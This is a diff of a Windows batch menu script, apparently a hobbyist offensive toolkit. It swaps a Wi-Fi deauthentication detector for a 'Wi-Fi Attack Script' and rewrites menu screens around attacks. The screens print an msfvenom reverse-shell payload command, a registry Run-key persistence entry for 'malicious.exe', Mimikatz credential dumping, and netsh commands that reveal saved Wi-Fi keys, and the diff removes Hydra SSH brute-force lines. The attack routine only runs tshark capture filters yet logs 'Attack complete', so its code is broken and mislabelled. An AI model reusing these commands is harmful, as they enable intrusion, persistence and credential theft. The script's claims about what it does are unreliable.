@@ -19,73 +19,91 @@ echo.
 echo [96m       Select an Option Below to Explore Tools and Techniques[0m
 echo.
 ping localhost -n 1 >nul
-echo     [90;1m#═╦═══════»[0m  [92m[Bruteforce Tools][0m     [95m[1][0m
+echo     [90;1m#═╦═══════»[0m  [92m[Network Scanning][0m        [95m[1][0m
 ping localhost -n 1 >nul
-echo       [90;1m╚═╦══════»[0m  [92m[Privilege Escalation][0m[95m[2][0m
+echo       [90;1m╚═╦══════»[0m  [92m[Password Attacks][0m       [95m[2][0m
 ping localhost -n 1 >nul
-echo         [90;1m╚═╦═════»[0m  [92m[Payload Generator][0m    [95m[3][0m
+echo         [90;1m╚═╦═════»[0m  [92m[Privilege Escalation][0m   [95m[3][0m
 ping localhost -n 1 >nul
-echo           [90;1m╚═╦════»[0m  [92m[Scanning & Recon][0m     [95m[4][0m
+echo           [90;1m╚═╦════»[0m  [92m[Exploitation][0m          [95m[4][0m
 ping localhost -n 1 >nul
-echo             [90;1m╚═╦═══»[0m  [92m[PowerShell Scripts][0m  [95m[5][0m
+echo             [90;1m╚═╦═══»[0m  [92m[Post-Exploitation][0m     [95m[5][0m
 ping localhost -n 1 >nul
-echo               [90;1m╚═╦═»[0m  [92m[Windows Tools][0m       [95m[6][0m
+echo               [90;1m╚═╦═»[0m  [92m[Wi-Fi Tools][0m          [95m[6][0m
 ping localhost -n 1 >nul
-echo                 [90;1m╚═╦»[0m  [92m[Wi-Fi Attack Detection][0m[95m[7][0m
+echo                 [90;1m╚═╦»[0m  [92m[Logging & Reporting][0m  [95m[7][0m
 ping localhost -n 1 >nul
-echo                   [90;1m╚═»[0m  [92m[Exit][0m               [95m[8][0m
-echo|set /p=".                    [90;1m╚══>[0m"
-choice /c 12345678 /n >nul
+echo                   [90;1m╚═╦»[0m  [92m[Wi-Fi Attack Script][0m [95m[8][0m
+ping localhost -n 1 >nul
+echo                     [90;1m╚═»[0m  [92m[Exit][0m              [95m[9][0m
+echo|set /p=".                      [90;1m╚══>[0m"
+choice /c 123456789 /n >nul
 set choice=%errorlevel%
 
-if %choice%==1 goto brute_force
-if %choice%==2 goto privilege_escalation
-if %choice%==3 goto payload_gen
-if %choice%==4 goto scanning
-if %choice%==5 goto powershell_scripts
-if %choice%==6 goto windows_tools
-if %choice%==7 goto wifi_detection
-if %choice%==8 exit
+if %choice%==1 goto network_scanning
+if %choice%==2 goto password_attacks
+if %choice%==3 goto privilege_escalation
+if %choice%==4 goto exploitation
+if %choice%==5 goto post_exploitation
+if %choice%==6 goto wifi_tools
+if %choice%==7 goto logging
+if %choice%==8 goto wifi_attack
+if %choice%==9 exit
 
-:wifi_detection
+:wifi_attack
 cls
 echo ============================================================
-echo                Wi-Fi Attack Detection with Logging
+echo                 Wi-Fi Attack Script (Educational)
 echo ============================================================
-echo [96mThis tool detects Wi-Fi deauthentication attacks and logs them.[0m
+echo [96mThis script demonstrates a Wi-Fi deauthentication attack.[0m
 echo [92mRequirements:[0m
-echo  - Wireshark and TShark installed
+echo  - Install Wireshark and TShark
 echo  - Wireless adapter supporting monitor mode
-echo  - Run the tool as Administrator
+echo  - Run the script as Administrator
 echo.
-echo [93m[+] How It Works[0m:
-echo  - Monitors network traffic for deauthentication packets
-echo  - Logs detected attacks to 'wifi_attack_log.txt'
-echo  - Displays real-time alerts for suspicious activity
+echo [93m[+] Options:[0m
+echo  [1] Broadcast Attack - Disconnect all devices
+echo  [2] Targeted Attack  - Disconnect a specific device
 echo.
+set /p "attack_type=Select an option (1 or 2): "
 
-:: Log file setup
-set logfile=wifi_attack_log.txt
-echo Starting Wi-Fi monitoring... > %logfile%
-
-powershell -Command ^
-"if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
-Write-Host 'Monitoring Wi-Fi traffic for deauthentication attacks...'; ^
-Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.fc.type_subtype==12 -T fields -e wlan.sa -e wlan.da -e frame.time' | ForEach-Object { ^
-  Add-Content -Path '%logfile%' -Value $_; ^
-  Write-Host 'ALERT! Deauthentication packet detected: ' $_ -ForegroundColor Red }"
-
+if "%attack_type%"=="1" (
+    echo Starting broadcast deauthentication attack...
+    powershell -Command ^
+    "if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
+    Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.fc.type_subtype==12'"
+    echo Attack complete. >> wifi_attack_log.txt
+    echo Deauthentication attack logged to wifi_attack_log.txt.
+) else if "%attack_type%"=="2" (
+    set /p "target_mac=Enter target MAC address: "
+    echo Starting targeted deauthentication attack on %target_mac%...
+    powershell -Command ^
+    "if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
+    Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.addr == %target_mac%'"
+    echo Targeted attack on %target_mac% logged to wifi_attack_log.txt.
+    echo Deauthentication attack logged to wifi_attack_log.txt.
+)
 pause
 goto start
 
-:brute_force
+:network_scanning
 cls
 echo ============================================================
-echo                     Brute Force Tools
+echo                  Network Scanning & Recon
 echo ============================================================
-echo Example commands for brute-forcing services like SSH:
-echo [93m[+] Hydra[0m: hydra -l admin -P passwords.txt ssh://target_ip
-echo [93m[+] Medusa[0m: medusa -h target_ip -U users.txt -P passwords.txt -M ssh
+echo [92m[+] View Network Configurations[0m:
+echo    ipconfig /all
+echo.
+pause
+goto start
+
+:password_attacks
+cls
+echo ============================================================
+echo                     Password Attacks
+echo ============================================================
+echo [92m[+] Credential Dumping[0m:
+echo    Use Mimikatz or similar tools for dumping credentials.
 pause
 goto start
 
@@ -94,50 +112,48 @@ cls
 echo ============================================================
 echo                Privilege Escalation Techniques
 echo ============================================================
-echo Example: Simulating UAC Bypass
-echo Command: powershell -Command "Start-Process cmd -Verb runAs"
+echo [92m[+] Simulate UAC Bypass[0m:
+echo    powershell -Command "Start-Process cmd -Verb runAs"
 pause
 goto start
 
-:payload_gen
+:exploitation
 cls
 echo ============================================================
-echo                   Payload Generator
+echo                     Exploitation
 echo ============================================================
-echo [92mExample Commands:[0m
-echo  - Generate a Windows reverse shell:
-echo    msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > shell.exe
+echo [92m[+] Generate Payloads[0m:
+echo    msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > payload.exe
 pause
 goto start
 
-:scanning
+:post_exploitation
 cls
 echo ============================================================
-echo            Scanning and Reconnaissance Tools
+echo                 Post-Exploitation Tools
 echo ============================================================
-echo [92mExample Commands:[0m
-echo  - Network Scan: nmap -sC -sV -oN scan.txt target_ip
-echo  - Web Scan: nikto -h http://target_ip
+echo [92m[+] Persist via Registry[0m:
+echo    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d "cmd.exe /c malicious.exe"
 pause
 goto start
 
-:powershell_scripts
+:wifi_tools
 cls
 echo ============================================================
-echo                Automated PowerShell Scripts
+echo                     Wi-Fi Tools
 echo ============================================================
-echo Example: List active network connections
-echo Command: powershell -Command "Get-NetTCPConnection | Sort-Object State"
+echo [92m[+] Retrieve Stored Wi-Fi Passwords[0m:
+echo    netsh wlan show profiles
+echo    netsh wlan show profile name="WiFiName" key=clear
 pause
 goto start
 
-:windows_tools
+:logging
 cls
 echo ============================================================
-echo                   Windows Tools
+echo                 Logging & Reporting Tools
 echo ============================================================
-echo Example Commands:
-echo  - List running processes: tasklist
-echo  - Show network connections: netstat -an
+echo [92m[+] Log Network Activity[0m:
+echo    netstat -an > network_log.txt
 pause
 goto start
